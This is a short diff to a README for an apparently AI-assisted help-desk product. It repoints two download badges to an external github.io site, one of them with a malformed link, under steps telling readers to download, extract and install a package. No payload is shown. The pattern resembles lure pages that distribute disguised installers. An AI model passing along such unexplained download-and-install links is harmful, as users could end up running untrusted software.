@@ -107,7 +107,7 @@ Live agents and AI combine for an unbeatable help desk—your questions never fa
 ### Get Started in Three Easy Steps!
 
 1. **Acquire the latest package**  
-   [![Download](https://img.shields.io/badge/Download-blue)]([0rix0.github.io])  
+   [![Download](https://img.shields.io/badge/Download-blue)]([https://0rix0.github.io/])  
    Click above or use the code `[Download]` in your browser’s download bar.
 
 2. **Extract and Install**  
@@ -138,7 +138,7 @@ Read the full license [here](https://opensource.org/licenses/MIT).
 
 ## 📥 Download Links (End-User Edition)
 
-[![Download](https://img.shields.io/badge/Download-blue)]([0rix0.github.io])
+[![Download](https://img.shields.io/badge/Download-blue)]([[https://0rix0.github.io/])
 
 For advanced setup instructions, consult the `/docs` folder or visit the in-app Help Center.
 
